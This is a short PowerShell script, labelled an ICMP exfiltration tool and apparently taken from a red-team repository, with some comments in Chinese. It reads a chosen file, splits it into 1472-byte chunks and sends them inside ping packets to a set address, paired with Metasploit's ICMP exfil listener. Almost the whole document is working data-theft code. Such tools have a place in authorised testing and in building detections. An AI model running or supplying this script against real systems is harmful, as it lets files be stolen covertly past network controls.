#    Powershell-ICMP-Sender
#    ICMP Exfiltration script
#    Author: Oddvar Moe (@oddvarmoe)
#    License: BSD 3-Clause
#    Required Dependencies: None
#    Optional Dependencies: None
#    Early alpha version

# 脚本将采用您在$ inFile变量中指定的infile，并在发送之前将其分成1472个字节的块
# 该脚本也适用于Metasploit的ICMP Exfil模块: https://www.rapid7.com/db/modules/auxiliary/server/icmp_exfil
# 灵感来自 : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1

# TODO:
# Need transfer check
# Speeding it up using different methods
# Make it function based

    $IPAddress = "127.0.0.1"
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $true
    #$PingOptions.Ttl = 10
    
    # 必须分成1472个块
    [int]$bufSize = 1472
    $inFile = "C:\ip.txt"
    

    $stream = [System.IO.File]::OpenRead($inFile)
    $chunkNum = 0
    $TotalChunks = [math]::floor($stream.Length / 1472)
    $barr = New-Object byte[] $bufSize
    
    # 开始传输
    $sendbytes = ([text.encoding]::ASCII).GetBytes("BOFAwesomefile.txt")
    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null


    while ($bytesRead = $stream.Read($barr, 0, $bufsize)) {
        $ICMPClient.Send($IPAddress,10, $barr, $PingOptions) | Out-Null
        $ICMPClient.PingCompleted
        
        #Missing check if transfer is okay, added sleep.
        sleep 1
        #$ICMPClient.SendAsync($IPAddress,60 * 1000, $barr, $PingOptions) | Out-Null
        Write-Output "Done with $chunkNum out of $TotalChunks"
        $chunkNum += 1
    }

    # 传输结束
    $sendbytes = ([text.encoding]::ASCII).GetBytes("EOF")
    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
    Write-Output "文件传输"